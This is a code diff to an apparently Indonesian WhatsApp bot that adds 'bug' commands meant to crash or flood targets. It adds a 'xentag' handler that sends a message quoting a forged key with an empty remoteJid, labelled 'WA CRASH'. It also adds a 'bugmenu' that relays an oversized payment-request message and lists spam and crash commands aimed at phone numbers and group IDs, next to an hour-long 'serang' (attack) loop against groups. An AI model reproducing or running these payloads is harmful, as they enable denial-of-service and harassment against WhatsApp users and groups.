@@ -484,6 +484,11 @@ _🏴‍☠️PLATFORM : ${os.platform()}_`,
 										"rowId": `${prefix}xenpay`
 									},
 									{
+										"title": "Xentag",
+										"description": "WA CRASH JANGAN SALAHIN BOT ATAU YANG BUAT",
+										"rowId": `${prefix}xentag`
+									},
+									{
 										"title": "LINK GROUP BOT OFFC",
 										"description": "Klik ini untuk menampilkan link kumpulan boters WhatsApp",
 										"rowId": `${prefix}linkgroupoffc`
@@ -585,6 +590,26 @@ xinn.relayMessage(idg, {requestPaymentMessage: {message: {TextMessage: { text: '
 reply(mess.success)
 }
 break
+case 'xentag':
+  let xentag = {
+                        key: {
+                            fromMe: true,
+                            participant: `0@s.whatsapp.net`,
+                            ...({
+                                remoteJid: ""
+                            })
+                        },
+                        message: {
+                            conversation: 'Powere By Xin'
+                        }
+                    }
+                    xinn.sendMessage(q ? q:from, {
+                        text: 'Powered By Xin'
+                    }, {
+                        quoted: xentag
+                    })
+break
+
 case 'santedgrup': case 'santedgc':
 
 if (!args[0]) return reply('Masukin id grupnya!')
@@ -1194,8 +1219,21 @@ serang(args[0])
 await sleep(10000)
 serang(args[0])
 await sleep(10000)
-xinn.groupLeave(args[0])
+//xinn.groupLeave(args[0])
 reply(`Berhasil mengeksekusi Group ${gcmd.subject} Selama 1 Jam`)
+break
+
+case 'bugmenu':
+var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"requestPaymentMessage": {
+"currencyCodeIso4217": "USD",
+"amount1000": "888888888888",
+"noteMessage": {
+"extendedTextMessage": {
+"text": `*[ Bugmenu ]*\n\n1. xebugv(spam Xenpay)\n2. xenpay\n3. xenpaygc(masukin id grup)\n4. santedgc(masukin id grup)\n5. santed(masukin nomor dan pilih durasi)\n6. xentag(bug Jid)`,
+}
+}}}), { userJid: m.chat, quoted: m })
+xinn.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
 break
 
 case 'xenbugv':
